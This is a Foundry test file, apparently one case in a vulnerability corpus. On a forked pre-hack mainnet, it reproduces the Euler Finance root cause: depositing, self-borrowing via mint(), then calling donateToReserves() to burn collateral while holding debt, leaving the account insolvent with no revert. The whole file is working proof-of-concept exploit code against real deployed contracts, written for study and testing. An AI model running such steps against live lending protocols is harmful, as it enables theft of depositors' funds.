// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

// --- minimal interfaces, signatures lifted straight from euler-contracts @ pre-hack ---
interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IMarkets {
    function underlyingToEToken(address underlying) external view returns (address);
    function enterMarket(uint256 subAccountId, address newMarket) external;
}

interface IEToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function balanceOfUnderlying(address account) external view returns (uint256);
}

interface IExec {
    // layout must match IRiskManager.LiquidityStatus
    struct LiquidityStatus {
        uint256 collateralValue;
        uint256 liabilityValue;
        uint256 numBorrows;
        bool borrowIsolated;
    }
    function liquidity(address account) external returns (LiquidityStatus memory);
}

/// @notice case004 (source: real) -- Euler Finance $197M root cause.
///         donateToReserves() omits the checkLiquidity() that every other
///         balance-mutating function in EToken.sol enforces, so an account WITH
///         DEBT can burn its own collateral to insolvency without the transaction
///         reverting. Proven against deployed Euler at a pre-hack mainnet block.
///         Requires ETH_RPC_URL (archive); the case is skipped automatically if it
///         is not set, so the synthetic corpus still runs offline.
contract EulerDonatePoC is Test {
    address constant EULER   = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant EXEC    = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant DAI     = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    IMarkets markets = IMarkets(MARKETS);
    IExec exec = IExec(EXEC);
    IEToken eDAI;
    bool internal rpcMissing;

    function setUp() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            rpcMissing = true;
            return;
        }
        // pre-hack mainnet state (the attack landed ~16817996); block is tunable
        vm.createSelectFork(rpc, 16817000);
        eDAI = IEToken(markets.underlyingToEToken(DAI));
    }

    function test_donateToReserves_createsBadDebt_withoutRevert() public {
        if (rpcMissing) {
            emit log("ETH_RPC_URL not set -- skipping the Euler fork-case");
            vm.skip(true);
            return;
        }

        deal(DAI, address(this), 1_000_000e18);
        IERC20(DAI).approve(EULER, type(uint256).max);

        markets.enterMarket(0, DAI);
        eDAI.deposit(0, 500_000e18); // collateral
        eDAI.mint(0, 100_000e18);    // self-borrow leverage: +100k eDAI collateral, +100k dDAI debt

        IExec.LiquidityStatus memory bal0 = exec.liquidity(address(this));
        emit log_named_uint("BEFORE collateralValue", bal0.collateralValue);
        emit log_named_uint("BEFORE liabilityValue ", bal0.liabilityValue);
        assertGe(bal0.collateralValue, bal0.liabilityValue, "should start solvent (mint passed checkLiquidity)");

        uint256 burned = eDAI.balanceOf(address(this));
        emit log_named_uint("eDAI incinerated via donate", burned);

        // THE BUG: no checkLiquidity here -> burning ALL collateral while holding debt must NOT revert
        eDAI.donateToReserves(0, type(uint256).max);

        IExec.LiquidityStatus memory bal1 = exec.liquidity(address(this));
        emit log_named_uint("AFTER  collateralValue", bal1.collateralValue);
        emit log_named_uint("AFTER  liabilityValue ", bal1.liabilityValue);

        assertGt(
            bal1.liabilityValue,
            bal1.collateralValue,
            "donateToReserves drove a deployed Euler account insolvent with NO revert -- bad debt minted"
        );
    }
}
